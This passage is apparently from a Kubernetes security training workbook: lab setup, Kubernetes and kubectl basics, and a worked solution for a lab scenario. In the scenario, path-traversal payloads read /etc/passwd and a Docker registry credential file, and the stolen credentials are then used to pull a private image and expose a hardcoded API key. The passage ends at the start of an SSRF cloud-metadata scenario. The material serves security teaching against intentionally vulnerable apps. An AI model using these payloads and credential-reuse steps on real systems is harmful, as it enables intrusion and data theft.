<pre><code class="language-bash">username: student
password: hackk8s
</code></pre>
<h1><a class="header" href="#configure-the-kubectl" id="configure-the-kubectl">Configure the <code>kubectl</code></a></h1>
<ul>
<li>Start Kubernetes student VM</li>
<li>Copy your configuration file <code>k8s-training-kubeconfig</code> to <code>/home/student/.kube/config</code>
<ul>
<li>The file <code>k8s-training-kubeconfig</code> is generated by <code>setup.sh</code> script as part of cluster creation</li>
</ul>
</li>
<li>Run the below command to confirm that everything works fine</li>
</ul>
<pre><code class="language-bash">kubectl get pods
</code></pre>
<p><img src="getting-started/images/kubectl-get-pods.png" alt="" /></p>
<h1><a class="header" href="#vulnerable-apps" id="vulnerable-apps">Vulnerable Apps</a></h1>
<p>Each student cluster has intentionally vulnerable apps running which will be used during lab scenarios. The apps are available in following URLs</p>
<pre><code>http://mailbox-service.oss-k8s-security.cloudsec.training
http://server-health.oss-k8s-security.cloudsec.training
http://connectivity-check.oss-k8s-security.cloudsec.training
</code></pre>
<p><strong>NOTE:</strong> All attacks described in this document must be executed from Kubernetes Student VM.</p>
<p>The apps are accessible from Student VM after you setup port forward locally. Open a terminal in Student VM and execute the command below to setup a port forward into the cluster.</p>
<pre><code>sudo kubectl port-forward -n kube-system svc/nginx-ingress-controller 80:80
</code></pre>
<p>Now you can navigate to the vulnerable applications by URL given above.</p>
<h1><a class="header" href="#getting-started-with-kubernetes" id="getting-started-with-kubernetes">Getting started with Kubernetes</a></h1>
<p>We will get started by following the <code>Kubernetes Basics</code> from the official documentation which is hosted at <a href="https://kubernetes.io">Kubernetes.io</a></p>
<p>This tutorial provides a walkthrough of the basics of the Kubernetes cluster orchestration system.</p>
<blockquote>
<p>This is an important module to understand and cover because Kubernetes has many technical terms and commands that may be new to the participants.</p>
</blockquote>
<p>Each module contains some background information on major Kubernetes features and concepts and includes an <strong>interactive online tutorial</strong>. This is great for practicing the basics. Did we mention that this is available to all without any charges so you can practice it whenever you feel like it?</p>
<p>These interactive tutorials let you manage a simple cluster and its containerized applications for yourself.</p>
<h2><a class="header" href="#creating-a-cluster" id="creating-a-cluster">Creating a Cluster</a></h2>
<ul>
<li><a href="https://kubernetes.io/docs/tutorials/kubernetes-basics/create-cluster/cluster-interactive/">https://kubernetes.io/docs/tutorials/kubernetes-basics/create-cluster/cluster-interactive/</a></li>
</ul>
<h2><a class="header" href="#deploying-an-app" id="deploying-an-app">Deploying an App</a></h2>
<ul>
<li><a href="https://kubernetes.io/docs/tutorials/kubernetes-basics/deploy-app/deploy-interactive/">https://kubernetes.io/docs/tutorials/kubernetes-basics/deploy-app/deploy-interactive/</a></li>
</ul>
<h2><a class="header" href="#exploring-your-app" id="exploring-your-app">Exploring Your App</a></h2>
<ul>
<li><a href="https://kubernetes.io/docs/tutorials/kubernetes-basics/explore/explore-interactive/">https://kubernetes.io/docs/tutorials/kubernetes-basics/explore/explore-interactive/</a></li>
</ul>
<h2><a class="header" href="#exposing-your-app" id="exposing-your-app">Exposing Your App</a></h2>
<ul>
<li><a href="https://kubernetes.io/docs/tutorials/kubernetes-basics/expose/expose-interactive/">https://kubernetes.io/docs/tutorials/kubernetes-basics/expose/expose-interactive/</a></li>
</ul>
<h2><a class="header" href="#scaling-your-app" id="scaling-your-app">Scaling Your App</a></h2>
<ul>
<li><a href="https://kubernetes.io/docs/tutorials/kubernetes-basics/scale/scale-interactive/">https://kubernetes.io/docs/tutorials/kubernetes-basics/scale/scale-interactive/</a></li>
</ul>
<h2><a class="header" href="#updating-your-app" id="updating-your-app">Updating Your App</a></h2>
<ul>
<li><a href="https://kubernetes.io/docs/tutorials/kubernetes-basics/update/update-interactive/">https://kubernetes.io/docs/tutorials/kubernetes-basics/update/update-interactive/</a></li>
</ul>
<h1><a class="header" href="#the-illustrated-childrens-guide-to-kubernetes" id="the-illustrated-childrens-guide-to-kubernetes">The Illustrated Children's Guide to Kubernetes</a></h1>
<p><a href="https://www.youtube.com/watch?v=4ht22ReBjno"><img src="https://img.youtube.com/vi/4ht22ReBjno/0.jpg" alt="The Illustrated Children's Guide to Kubernetes" /></a></p>
<p>source: <a href="https://www.youtube.com/watch?v=4ht22ReBjno">https://www.youtube.com/watch?v=4ht22ReBjno</a></p>
<h1><a class="header" href="#introduction-to-kubernetes" id="introduction-to-kubernetes">Introduction to Kubernetes</a></h1>
<h2><a class="header" href="#why-containers" id="why-containers">Why Containers</a></h2>
<p><img src="kubernetes-101/images/before-docker.png" alt="Old way of deploying applications" /></p>
<p>The Old Way to deploy applications was to install the applications on a host using the operating system package manager. This had the disadvantage of entangling the applications' executables, configuration, libraries and lifecycles with each other and with the host OS. One could build immutable virtual machines(VM) in order to achieve predictable rollouts and rollbacks, but VMs are heavyweight and non-portable.</p>
<p><img src="kubernetes-101/images/after-docker.png" alt="Modern way of deploying applications in the DevOps age" /></p>
<p>The New Way is to deploy containers based on operating system level virtualization rather than hardware virtualization. These containers are isolated from each other and from the host</p>
<ul>
<li>they have their own filesystem</li>
<li>they can't see each others processes</li>
<li>their computational resource usage can be bounded</li>
</ul>
<p>They are easier to build than VMs, and because they are decoupled from the underlying infrastructure and from the host filesystem, they are portable across public IAAS clouds and OS distributions.</p>
<h2><a class="header" href="#why-kubernetes" id="why-kubernetes">Why Kubernetes</a></h2>
<p>A lot of developers have moved or are moving from a traditional world to a container based ecosystem. This allows developers to package their application code, dependencies and required libraries in a simple container and use it anywhere wherever there is a container runtime available.</p>
<blockquote>
<p>An example of a container runtime is Docker</p>
</blockquote>
<p>At a minimum, Kubernetes can schedule and run application containers on clusters of physical or virtual machines. However, Kubernetes also allows developers to ‘cut the cord’ to physical and virtual machines, moving from a host-centric infrastructure to a container-centric infrastructure.</p>
<p>This approach provides the full advantages and benefits inherent to containers. Kubernetes provides the infrastructure to build a truly container centric development environment. This is the primary reason developers love it.</p>
<h2><a class="header" href="#what-is-kubernetes" id="what-is-kubernetes">What is Kubernetes</a></h2>
<p>With Kubernetes, you are able to quickly and efficiently respond to customer demand</p>
<ul>
<li>Deploy your applications quickly and predictably</li>
<li>Scale your applications on the fly</li>
<li>Roll out new features seamlessly</li>
<li>Limit hardware usage to required resources only</li>
<li>Our goal is to foster an ecosystem of components and tools that relieve the burden of running applications in public and private clouds</li>
</ul>
<blockquote>
<p>According to Brian Grant <a href="http://www.slideshare.net/BrianGrant11/wso2con-us-2015-kubernetes-a-platform-for-automating-deployment-scaling-and-operations">Kubernetes is an open-source platform designed to automate deploying, scaling, and operating application containers</a>.</p>
</blockquote>
<p>Kubernetes is</p>
<ul>
<li><strong>Portable</strong>: public, private, hybrid, multi-cloud</li>
<li><strong>Extensible</strong>: modular, pluggable, hookable, composable</li>
<li><strong>Self-healing</strong>: auto-placement, auto-restart, auto-replication, auto-scaling</li>
</ul>
<blockquote>
<p>Google started the Kubernetes project in 2014. Kubernetes builds upon a <a href="https://research.google.com/pubs/pub43438.html">decade and a half of experience that Google has with running production workloads at scale</a>, combined with best-of-breed ideas and practices from the community.</p>
</blockquote>
<h3><a class="header" href="#additional-references-for-further-reading" id="additional-references-for-further-reading">Additional references for further reading</a></h3>
<ul>
<li><a href="https://aucouranton.com/2014/06/13/linux-containers-parallels-lxc-openvz-docker-and-more/">https://aucouranton.com/2014/06/13/linux-containers-parallels-lxc-openvz-docker-and-more/</a></li>
<li><a href="https://kubernetes.io/docs/concepts/overview/what-is-kubernetes/">https://kubernetes.io/docs/concepts/overview/what-is-kubernetes/</a></li>
</ul>
<h1><a class="header" href="#kubernetes-overview" id="kubernetes-overview">Kubernetes Overview</a></h1>
<p><img src="kubernetes-101/images/Kubernetes.png" alt="Kubernetes overview" /></p>
<p>Image source: Khtan66 <a href="https://creativecommons.org/licenses/by-sa/4.0%22">CC BY-SA 4.0</a>, <a href="https://commons.wikimedia.org/wiki/File:Kubernetes.png">from Wikimedia Commons</a></p>
<ul>
<li>To work with Kubernetes, you use Kubernetes API objects to describe your cluster’s desired state</li>
<li>You set your desired state by creating objects using the Kubernetes API, typically via the command-line interface, <code>kubectl</code></li>
<li>You can also use the Kubernetes API directly to interact with the cluster and set or modify your desired state</li>
<li>Kubernetes Control Plane works to make the cluster’s current state match the desired state</li>
<li>Kubernetes performs a variety of tasks automatically
<ul>
<li>such as starting or restarting containers</li>
<li>scaling the number of replicas of a given application</li>
<li>and a lot more</li>
</ul>
</li>
</ul>
<h2><a class="header" href="#kubernetes-master" id="kubernetes-master">Kubernetes Master</a></h2>
<p>The Kubernetes Master is a collection of three processes that run on a single node in your cluster, which is designated as the master node. Those processes are</p>
<ul>
<li><a href="https://kubernetes.io/docs/admin/kube-apiserver/">kube-apiserver</a></li>
<li><a href="https://kubernetes.io/docs/admin/kube-controller-manager/">kube-controller-manager</a></li>
<li><a href="https://kubernetes.io/docs/admin/kube-scheduler/">kube-scheduler</a></li>
</ul>
<h2><a class="header" href="#kubernetes-node" id="kubernetes-node">Kubernetes Node</a></h2>
<p>Each individual non-master node in your cluster runs two processes:</p>
<ul>
<li><a href="https://kubernetes.io/docs/admin/kubelet/">kubelet</a>, which communicates with the Kubernetes Master</li>
<li><a href="https://kubernetes.io/docs/admin/kube-proxy/">kube-proxy</a>, a network proxy which reflects Kubernetes networking services on each node</li>
</ul>
<h2><a class="header" href="#kubernetes-objects" id="kubernetes-objects">Kubernetes Objects</a></h2>
<p>Kubernetes contains a number of abstractions that represent the state of your system. These abstractions are represented by objects in the Kubernetes API; see the <a href="https://kubernetes.io/docs/concepts/abstractions/overview/">Kubernetes Objects overview</a> for more details.</p>
<h3><a class="header" href="#basic-objects" id="basic-objects">Basic Objects</a></h3>
<p>The basic Kubernetes objects include:</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pod</a></li>
<li><a href="https://kubernetes.io/docs/concepts/services-networking/service/">Service</a></li>
<li><a href="https://kubernetes.io/docs/concepts/storage/volumes/">Volume</a></li>
<li><a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces/">Namespace</a></li>
</ul>
<h3><a class="header" href="#higher-level-abstractions" id="higher-level-abstractions">Higher Level Abstractions</a></h3>
<p>In addition, Kubernetes contains a number of higher-level abstractions called Controllers. Controllers build upon the basic objects, and provide additional functionality and convenience features. They include</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/replicaset/">ReplicaSet</a></li>
<li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/deployment/">Deployment</a></li>
<li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/statefulset/">StatefulSet</a></li>
<li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/">DaemonSet</a></li>
<li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/jobs-run-to-completion/">Job</a></li>
</ul>
<h1><a class="header" href="#understanding-kubernetes-specific-technical-terms" id="understanding-kubernetes-specific-technical-terms">Understanding Kubernetes specific technical terms</a></h1>
<p>The below are the very high level description and explanation of terminology used in this book in terms of Kubernetes.</p>
<blockquote>
<p>From <a href="http://kubernetesbyexample.com">Kubernetes By Example</a> by the Red Hat OpenShift team</p>
</blockquote>
<h2><a class="header" href="#terms" id="terms">Terms</a></h2>
<h3><a class="header" href="#pods" id="pods">Pods</a></h3>
<p>A pod is a collection of containers sharing a network and mount namespace and is the basic unit of deployment in Kubernetes. All containers in a pod are scheduled on the same node.</p>
<h3><a class="header" href="#services" id="services">Services</a></h3>
<p>A service is a grouping of pods that are running on the cluster. A Kubernetes Service is an abstraction which defines a logical set of Pods and a policy by which to access them - sometimes called a micro-service. The set of Pods targeted by a Service is (usually) determined by a Label Selector (see below for why you might want a Service without a selector).</p>
<h3><a class="header" href="#volumes" id="volumes">Volumes</a></h3>
<p>A Kubernetes volume is essentially a directory accessible to all containers running in a pod. First, when a container crashes, kubelet will restart it, but the files will be lost - the container starts with a clean state. Second, when running containers together in a Pod it is often necessary to share files between those containers. The Kubernetes Volume abstraction solves both of these problems.</p>
<h3><a class="header" href="#namespaces-1" id="namespaces-1">Namespaces</a></h3>
<p>Namespaces provide for a scope of Kubernetes objects. You can think of it as a workspace you’re sharing with other users. Many objects such as pods and services are namespaced, while some (like nodes) are not. As a developer you’d usually simply use an assigned namespace, however admins may wish to manage them, for example to set up access control or resource quotas.</p>
<h3><a class="header" href="#replication-controllers" id="replication-controllers">Replication Controllers</a></h3>
<p>A replication controller (RC) is a supervisor for long-running pods. An RC will launch a specified number of pods called replicas and makes sure that they keep running, for example when a node fails or something inside of a pod, that is, in one of its containers goes wrong.</p>
<h3><a class="header" href="#deployments" id="deployments">Deployments</a></h3>
<p>A deployment is a supervisor for pods and replica sets, giving you fine-grained control over how and when a new pod version is rolled out as well as rolled back to a previous state.</p>
<h3><a class="header" href="#labels" id="labels">Labels</a></h3>
<p>Labels are the mechanism you use to organize Kubernetes objects. A label is a key-value pair with certain restrictions concerning length and allowed values but without any pre-defined meaning. So you’re free to choose labels as you see fit, for example, to express environments such as ‘this pod is running in production’ or ownership, like ‘department X owns that pod’.</p>
<h3><a class="header" href="#service-discovery" id="service-discovery">Service Discovery</a></h3>
<p>Service discovery is the process of figuring out how to connect to a service. While there is a service discovery option based on environment variables available, the DNS-based service discovery is preferable. Note that DNS is a cluster add-on so make sure your Kubernetes distribution provides for one or install it yourself.</p>
<h3><a class="header" href="#health-checks" id="health-checks">Health Checks</a></h3>
<p>In order to verify if a container in a pod is healthy and ready to serve traffic, Kubernetes provides for a range of health checking mechanisms. Health checks, or probes as they are called in Kubernetes, are carried out by the kubelet to determine when to restart a container (for livenessProbe) and by services to determine if a pod should receive traffic or not (for readinessProbe).</p>
<h3><a class="header" href="#environment-variables" id="environment-variables">Environment Variables</a></h3>
<p>You can set environment variables for containers running in a pod and in addition, Kubernetes exposes certain runtime infos via environment variables automatically.</p>
<h3><a class="header" href="#secrets" id="secrets">Secrets</a></h3>
<p>You don’t want sensitive information such as a database password or an API key kept around in clear text. Secrets provide you with a mechanism to use such information in a safe and reliable way.</p>
<h3><a class="header" href="#logging" id="logging">Logging</a></h3>
<p>Logging is one option to understand what is going on inside your applications and the cluster at large. Basic logging in Kubernetes makes the output a container produces available, which is a good use case for debugging. More advanced setups consider logs across nodes and store them in a central place, either within the cluster or via a dedicated (cloud-based) service.</p>
<h3><a class="header" href="#jobs" id="jobs">Jobs</a></h3>
<p>A job is a supervisor for pods carrying out batch processes, that is, a process that runs for a certain time to completion, for example a calculation or a backup operation.</p>
<h3><a class="header" href="#nodes" id="nodes">Nodes</a></h3>
<p>In Kubernetes, the nodes are the worker machines where your pods run.</p>
<h3><a class="header" href="#replica-sets" id="replica-sets">Replica Sets</a></h3>
<p>ReplicaSet is the next-generation Replication Controller. The only difference between a ReplicaSet and a Replication Controller right now is the selector support. ReplicaSet supports the new set-based selector requirements as Replication Controller only supports equality-based selector requirements.</p>
<h3><a class="header" href="#stateful-sets" id="stateful-sets">Stateful Sets</a></h3>
<p>StatefulSet is the workload API object used to manage stateful applications. Manages the deployment and scaling of a set of Pods, and provides guarantees about the ordering and uniqueness of these Pods.</p>
<h3><a class="header" href="#daemon-sets" id="daemon-sets">Daemon Sets</a></h3>
<p>A DaemonSet ensures that all (or some) Nodes run a copy of a Pod. As nodes are added to the cluster, Pods are added to them. As nodes are removed from the cluster, those Pods are garbage collected. Deleting a DaemonSet will clean up the Pods it created.</p>
<h2><a class="header" href="#references-4" id="references-4">References</a></h2>
<ul>
<li>The best way to learn is looking at documentation by <a href="https://kubernetes.io/docs/concepts/">Kubernetes Docs</a></li>
<li><a href="kubernetes-101/../terminology-glossary.html">Glossary for the documentation</a></li>
</ul>
<h1><a class="header" href="#kubectl-usage-for-pentesters" id="kubectl-usage-for-pentesters">Kubectl usage for pentesters</a></h1>
<p><code>kubectl</code> is a command line interface for running commands against Kubernetes clusters. <code>kubectl</code> is pronounced as <code>cube c t l</code>. Watch this talk for <a href="https://www.youtube.com/watch?v=2wgAIvXpJqU">The definitive pronunciation guide</a> :)</p>
<blockquote>
<p>We have already added it to the attacker VM already shared with you.</p>
</blockquote>
<ul>
<li>Getting the kubernetes cluster information</li>
</ul>
<pre><code class="language-bash">kubectl cluster-info
</code></pre>
<p><img src="kubernetes-101/images/kubectl-cluster-info.png" alt="" /></p>
<ul>
<li>Get information from nodes, pods, svc(services), ing(ingress), ns(namespace), deploy(deployments)</li>
</ul>
<pre><code class="language-bash">kubectl get nodes
kubectl get pods
</code></pre>
<pre><code class="language-bash">kubectl get services
</code></pre>
<p>Bunch of these commands can use shortcuts. For example the rest of the commands are using their shortcuts.</p>
<pre><code class="language-bash">kubectl get svc
kubectl get ing
kubectl get ns
kubectl get deploy
</code></pre>
<p><img src="kubernetes-101/images/kubectl-pods.png" alt="" /></p>
<ul>
<li>Getting more information</li>
</ul>
<pre><code class="language-bash">kubectl get nodes -o wide
kubectl get pods -o wide
kubectl get svc -o wide
kubectl get deploy -o wide
</code></pre>
<p><img src="kubernetes-101/images/kubectl-pods-wide.png" alt="" /></p>
<ul>
<li>Getting detailed information</li>
</ul>
<pre><code class="language-bash">kubectl describe node &lt;NODENAME&gt;
kubectl describe pod &lt;PODNAME&gt;
kubectl describe svc &lt;SVCNAME&gt;
kubectl describe ing &lt;SVCNAME&gt;
kubectl describe ns &lt;SVCNAME&gt;
kubectl describe deploy &lt;DEPLOYNAME&gt;
</code></pre>
<p><img src="kubernetes-101/images/kubectl-describe-pod.png" alt="" /></p>
<ul>
<li>Detailed help for the sub command</li>
</ul>
<pre><code class="language-bash">kubectl explain pod
</code></pre>
<p><img src="kubernetes-101/images/kubectl-explain.png" alt="" /></p>
<ul>
<li>Creating deployment using command line</li>
</ul>
<pre><code class="language-bash">kubectl run nginxdeployment --image=nginx:alpine
</code></pre>
<ul>
<li>Port forward the pod to local system</li>
</ul>
<pre><code class="language-bash">kubectl port-forward &lt;PODNAME&gt; 1234:80
</code></pre>
<p><img src="kubernetes-101/images/kubectl-deploy-portfwd.png" alt="" /></p>
<p><img src="kubernetes-101/images/nginx-site.png" alt="" /></p>
<ul>
<li>Deleting pod</li>
</ul>
<pre><code class="language-bash">kubectl delete pod &lt;PODNAME&gt;
kubectl delete deploy &lt;DEPLOYNAME&gt;
kubectl delete svc &lt;SVCNAME&gt;
kubectl delete ing &lt;INGNAME&gt;
kubectl delete ns &lt;NSNAME&gt;
</code></pre>
<p><img src="kubernetes-101/images/kubectl-delete-pod.png" alt="" /></p>
<ul>
<li>Shell into the pod</li>
</ul>
<pre><code class="language-bash">kubectl exec -it &lt;PODNAME&gt; sh
</code></pre>
<p><img src="kubernetes-101/images/kubectl-exec.png" alt="" /></p>
<ul>
<li>Looking for logs (stdout &amp; stderr)</li>
</ul>
<pre><code class="language-bash">kubectl logs &lt;PODNAME&gt;
kubectl logs -f &lt;PODNAME&gt;
</code></pre>
<p><img src="kubernetes-101/images/kubectl-logs.png" alt="" /></p>
<ul>
<li>Combining multiple commands</li>
</ul>
<pre><code class="language-bash">kubectl get pods,svc
</code></pre>
<p><img src="kubernetes-101/images/kubectl-combined.png" alt="" /></p>
<ul>
<li>Specifying with different namepsace</li>
</ul>
<pre><code class="language-bash">kubectl get pods -n database
</code></pre>
<p><img src="kubernetes-101/images/kubectl-namespace.png" alt="" /></p>
<ul>
<li>Listing the API resources avialble</li>
</ul>
<pre><code class="language-bash">kubectl api-resources
</code></pre>
<ul>
<li>Checking for the permission to do</li>
</ul>
<pre><code class="language-bash">kubectl auth can-i create pods
</code></pre>
<p><img src="kubernetes-101/images/kubectl-auth-can-i.png" alt="" /></p>
<ul>
<li>Getting output in YAML format</li>
</ul>
<pre><code class="language-bash">kubectl get secrets &lt;SECRETNAME&gt; -o yaml
</code></pre>
<p><img src="kubernetes-101/images/kubectl-get-secret-yaml.png" alt="" /></p>
<h2><a class="header" href="#references-5" id="references-5">References</a></h2>
<ul>
<li><a href="https://kubernetes.io/docs/reference/kubectl/cheatsheet/">kubectl Cheat Sheet</a></li>
<li><a href="https://github.com/dennyzhang/cheatsheet-kubernetes-A4">Kubernetes CheatSheets In A4</a></li>
</ul>
<h1><a class="header" href="#deploying-simple-application-in-kubernetes-cluster" id="deploying-simple-application-in-kubernetes-cluster">Deploying simple application in Kubernetes Cluster</a></h1>
<ul>
<li><a href="deploy-app/using-yaml.html">Using yaml manifest</a></li>
<li><a href="deploy-app/using-helm.html">Using helm chart</a></li>
</ul>
<h1><a class="header" href="#deploying-simple-application-in-kubernetes-cluster-using-yaml" id="deploying-simple-application-in-kubernetes-cluster-using-yaml">Deploying simple application in Kubernetes Cluster using YAML</a></h1>
<ul>
<li>To create a basic nginx deployment with 2 replicas, save this file as <code>nginx-deployment.yaml</code> using your text editor</li>
</ul>
<pre><code class="language-yaml">apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
spec:
  selector:
    matchLabels:
      app: nginx
  replicas: 2
  template:
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - name: nginx
        image: nginx:1.7.9
        ports:
        - containerPort: 80
</code></pre>
<ul>
<li>Run the apply command to perform the changes in cluster</li>
</ul>
<pre><code class="language-bash">kubectl apply -f nginx-deployment.yaml
</code></pre>
<ul>
<li>Get the pods related to this deployment</li>
</ul>
<pre><code class="language-bash">kubectl get pods --selector app=nginx
</code></pre>
<p><img src="deploy-app/images/deploy-app-get-pods.png" alt="" /></p>
<ul>
<li>Update the deployment file with <code>replicas</code> to 3 in <code>nginx-deployment.yaml</code> using your text editor</li>
</ul>
<pre><code class="language-yaml">...
  replicas: 3
...
</code></pre>
<ul>
<li>Apply the changes</li>
</ul>
<pre><code class="language-bash">kubectl apply -f nginx-deployment.yaml
kubectl get pods --selector app=nginx
</code></pre>
<p><img src="deploy-app/images/update-deployment.png" alt="" /></p>
<ul>
<li>Expose a service within the cluster</li>
<li>Create a file <code>nginx-service.yml</code> with the following content</li>
</ul>
<pre><code>apiVersion: v1
kind: Service
metadata:
  name: nginx-deployment
spec:
  ports:
  - port: 80
    protocol: TCP
    targetPort: 80
  selector:
    app: nginx
  type: ClusterIP
</code></pre>
<ul>
<li>Create the service in the cluster</li>
</ul>
<pre><code>kubectl apply -f nginx-service.yml
</code></pre>
<ul>
<li>Start a <code>port-foward</code> to access in-cluster service</li>
</ul>
<pre><code>kubectl port-forward svc/nginx-deployment 8888:80
</code></pre>
<ul>
<li>From another terminal, access the service through the port forward</li>
</ul>
<pre><code>curl http://localhost:8888/
</code></pre>
<ul>
<li>Delete the deployment</li>
</ul>
<pre><code class="language-bash">kubectl delete -f nginx-deployment.yaml
</code></pre>
<p><img src="deploy-app/images/delete-deploy.png" alt="" /></p>
<ul>
<li>Delete the service</li>
</ul>
<pre><code>kubectl delete -f nginx-service.yml
</code></pre>
<h3><a class="header" href="#references-6" id="references-6">References</a></h3>
<ul>
<li><a href="https://kubernetes.io/docs/tasks/run-application/run-stateless-application-deployment/">https://kubernetes.io/docs/tasks/run-application/run-stateless-application-deployment/</a></li>
</ul>
<h1><a class="header" href="#deploying-simple-application-in-kubernetes-cluster-using-helm-chart" id="deploying-simple-application-in-kubernetes-cluster-using-helm-chart">Deploying simple application in Kubernetes Cluster using Helm Chart</a></h1>
<ul>
<li>Deploying an app using basic helm chart, navigate to <code>sample-nginx</code> helm chart folder</li>
</ul>
<pre><code class="language-bash">cd /data/sample-nginx
</code></pre>
<ul>
<li>Deploy the helm chart by running the following command</li>
</ul>
<pre><code class="language-bash">helm install --name sample-nginx .
</code></pre>
<p><img src="deploy-app/images/helm-deploy.png" alt="" /></p>
<ul>
<li>Access the app using output template</li>
</ul>
<pre><code class="language-bash">export POD_NAME=$(kubectl get pods --namespace default -l &quot;app.kubernetes.io/name=sample-nginx,app.kubernetes.io/instance=sample-nginx&quot; -o jsonpath=&quot;{.items[0].metadata.name}&quot;)
kubectl port-forward $POD_NAME 8080:80
</code></pre>
<ul>
<li>Visit http://127.0.0.1:8080 to use your application</li>
</ul>
<p><img src="deploy-app/images/helm-deploy-access.png" alt="" /></p>
<ul>
<li>Change the <code>values.yaml</code> in the sample-nginx helm chart. Replace <code>tag: alpine</code> with <code>tag: latest</code></li>
</ul>
<pre><code class="language-bash">...
tag: alpine
...

to

...
tag: latest
...
</code></pre>
<ul>
<li>Upgrade the helm chart with new release</li>
</ul>
<pre><code class="language-bash">helm upgrade sample-nginx .
</code></pre>
<ul>
<li>Check the helm chart details and revisions</li>
</ul>
<pre><code class="language-bash">helm ls sample-nginx
</code></pre>
<p><img src="deploy-app/images/helm-ls.png" alt="" /></p>
<ul>
<li>Deleting the helm chart</li>
</ul>
<pre><code class="language-bash">helm delete --purge sample-nginx
</code></pre>
<h3><a class="header" href="#references-7" id="references-7">References</a></h3>
<ul>
<li><a href="https://docs.helm.sh/">https://docs.helm.sh/</a></li>
</ul>
<h1><a class="header" href="#scenario-1---exploiting-private-registry-via-misconfiguration" id="scenario-1---exploiting-private-registry-via-misconfiguration">Scenario-1 - Exploiting Private Registry via Misconfiguration</a></h1>
<ul>
<li><a href="scenario-1/scenario.html">Scenario</a></li>
<li><a href="scenario-1/solution.html">Solution</a></li>
<li><a href="scenario-1/discussion.html">Discussion</a></li>
</ul>
<h1><a class="header" href="#exploiting-private-registry-via-misconfiguration---scenario" id="exploiting-private-registry-via-misconfiguration---scenario">Exploiting Private Registry via Misconfiguration - Scenario</a></h1>
<p>Bob's company has deployed a new mail application for them to use. Alas, this application is riddled with bugs! Most of which arise from default configurations and poor programming practices. There has been speculation that the internal team did not even remove the readme file for this application!</p>
<p>In any case, as an attacker you know that the application is deployed using docker. Can we use a vulnerability to read files that we are not meant to and see what the docker private registry looks like? Who knows what secrets you may find!</p>
<h2><a class="header" href="#tips" id="tips">Tips</a></h2>
<ul>
<li>Endpoint for your attack is <code>http://mailbox-service.student-uniquename.cloudsec.training</code>. Replace <code>uniquename</code> with your unique name</li>
<li>The login credentials for the application are <code>username: bob</code> and <code>password: bobmailbox</code></li>
<li><code>README.md</code> exists</li>
<li>The app is vulnerable to <code>LFI</code></li>
</ul>
<h1><a class="header" href="#exploiting-private-registry-via-misconfiguration---solution" id="exploiting-private-registry-via-misconfiguration---solution">Exploiting Private Registry via Misconfiguration - Solution</a></h1>
<ul>
<li>
<p>Navigate to the application <code>http://mailbox-service.student-uniquename.cloudsec.training</code></p>
</li>
<li>
<p>Login to the application using <code>username: bob</code> and <code>password: bobmailbox</code></p>
</li>
</ul>
<p><img src="scenario-1/images/app-login.png" alt="" /></p>
<ul>
<li>We can see that <code>README.md</code> discloses information regarding the private registry</li>
</ul>
<p><img src="scenario-1/images/information-disclosure.png" alt="" /></p>
<ul>
<li>
<p>It appears that the <code>page</code> parameter is vulnerable to an Insecure Direct Object Reference, potentially allowing us to read other files on the system.</p>
</li>
<li>
<p>Let's try out a common payload and see if this IDOR is actually a path traversal vulnerability. We can gain read a local files using payload <code>qqqqq/../../etc/passwd</code></p>
</li>
</ul>
<p><img src="scenario-1/images/path-traversal-exploitation.png" alt="" /></p>
<ul>
<li>Similarly we can read other sensitive files in the system and find that the system contains <code>/root/.docker/config.json</code> with payload <code>qqqqq/../../root/.docker/config.json</code></li>
</ul>
<p><img src="scenario-1/images/docker-config.png" alt="" /></p>
<ul>
<li>
<p>We can use this docker configuration to pull docker images from private registry. Save the <code>config.json</code> file onto your system</p>
</li>
<li>
<p>Run the following command to configure the docker private registry using configuration file.</p>
</li>
</ul>
<pre><code class="language-bash">docker login -u _json_key -p &quot;$(cat config.json)&quot; https://gcr.io
</code></pre>
<p><img src="scenario-1/images/docker-registry-login.png" alt="" /></p>
<ul>
<li>Now pull the private registry image to get the backend source code</li>
</ul>
<pre><code class="language-bash">docker pull gcr.io/training-automation-stuff/backend-source-code:latest
</code></pre>
<p><img src="scenario-1/images/pull-private-image.png" alt="" /></p>
<ul>
<li>Inspecting the image using the docker run command</li>
</ul>
<pre><code class="language-bash">docker run --rm -it gcr.io/training-automation-stuff/backend-source-code:latest sh
ls -la
cat index.js
</code></pre>
<p><img src="scenario-1/images/source-code-hardcoded-key.png" alt="" /></p>
<ul>
<li>Now you can see that we have got the <code>NASA_DEMO_API_KEY</code> which is hard coded in the container image</li>
</ul>
<h1><a class="header" href="#discussion" id="discussion">Discussion</a></h1>
<p><img src="scenario-1/images/discussion.png" alt="" /></p>
<p>Image Source: <a href="https://commons.wikimedia.org/wiki/File:Discussion.png">https://commons.wikimedia.org/wiki/File:Discussion.png</a></p>
<h1><a class="header" href="#scenario-2---attacking-kubernetes-cluster-metadata-using-ssrf-vulnerability" id="scenario-2---attacking-kubernetes-cluster-metadata-using-ssrf-vulnerability">Scenario-2 - Attacking Kubernetes Cluster Metadata using SSRF vulnerability</a></h1>
<ul>
<li><a href="scenario-2/scenario.html">Scenario</a></li>
<li><a href="scenario-2/solution.html">Solution</a></li>
<li><a href="scenario-2/discussion.html">Discussion</a></li>
</ul>
<h1><a class="header" href="#attacking-kubernetes-cluster-metadata-using-ssrf-vulnerability---scenario" id="attacking-kubernetes-cluster-metadata-using-ssrf-vulnerability---scenario">Attacking Kubernetes Cluster Metadata using SSRF vulnerability - Scenario</a></h1>
<p>Applications hosted on the cloud can lead to a whole slew of other problems. Especially, vulnerable ones :)</p>
<p>Bob's company has an application deployed on GCP that allows you to quickly check the health of other web applications on the Internet. The application uses a server side function to connect to the specified URL and let's Bob know if the web app is functioning as expected or not.</p>
<p>Well, the most common problem applications like this face is not sanitizing user input which allows Bob to specify any endpoint (and of course any port) to make the server perform a GET request.</p>
<p>This is bad, yes, but it can be worse for applications on the cloud as you can query the helpful metadata endpoints. That is whole playground for you to explore. Let's see what we can do with this scenario!</p>
<h2><a class="header" href="#tips-1" id="tips-1">Tips</a></h2>
<ul>
